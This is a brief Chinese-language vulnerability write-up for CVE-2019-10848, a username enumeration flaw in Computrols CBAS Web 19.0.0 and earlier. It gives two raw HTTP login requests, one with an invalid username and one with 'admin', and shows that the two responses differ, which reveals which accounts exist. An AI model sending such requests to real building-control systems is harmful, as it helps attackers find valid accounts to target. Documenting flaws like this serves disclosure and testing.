# （CVE-2019-10848）Computrols CBAS Web 用户名枚举

> 原文：[https://www.zhihuifly.com/t/topic/2852](https://www.zhihuifly.com/t/topic/2852)

# （CVE-2019-10848）Computrols CBAS Web 用户名枚举

## 一、漏洞简介

## 二、漏洞影响

19.0.0及以下

## 三、复现过程

### 测试无效用户：

```
POST /cbas/index.php?m=auth&a=login HTTP/1.1 `username=randomuser&password=&challenge=60753c1b5e449de80e21472b5911594d&response=e16371917371b8b70529737813840c62` 
```

Response

```
<!-- Failed login comments appear here -->
<p class="alert-error">randomuser</p> 
```

### 测试有效用户：

```
POST /cbas/index.php?m=auth&a=login HTTP/1.1 `username=admin&password=&challenge=6e4344e7ac62520dba82d7f20ccbd422&response=e09aab669572a8e4576206d5c14befc5s` 
```

Response

```
<!-- Failed login comments appear here -->
<p class="alert-error">Invalid username/password combination.  Please try again!</p> 
```